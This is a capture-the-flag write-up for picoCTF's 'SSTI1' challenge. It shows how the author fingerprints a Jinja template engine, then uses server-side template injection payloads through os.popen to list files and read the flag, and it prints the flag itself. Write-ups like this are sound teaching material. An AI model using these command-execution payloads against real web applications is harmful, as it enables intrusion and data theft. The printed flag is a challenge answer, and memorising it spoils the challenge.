# SSTI1
I made a cool website where you can announce whatever you want! Try it out!
Additional details will be available after launching your challenge instance.

## My Solution:
1) So firstly we have a website that announces anything as input.
2) The challenge instance provides the hint Server-Side Template Injection (SSTI).
3) To execute a successful SSTI attack, it is first important to identify what template engine was being used.
4) The input {{ 7 * 7 }} was tested and successfully executed the code, returning the result 49.
5) This narrowed the language down to either Jinja or Twig.
6) To differentiate, a test was run to check how the system handles the multiplication of an integer and a string: {{ 7 * '7' }}.
7) The result was the string '7' repeated seven times (7777777), which confirms the template engine is Jinja .
8) Now, in the input box, '''{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('ls')['read']()}}''' was pasted.
9) This gives us the list of files present, which includes the flag file.
10) Then, '''{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('cat flag')['read']()}}''' was inputted.
11) this printed the flag file.


*Flag:* picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_dcdca99a}

## Concepts Learnt:
Came to know about SSTI attacks and vulnerabilities.

## Notes:
Anytime a website has a function that has a print out function, that might have a SSTI vulnerability.
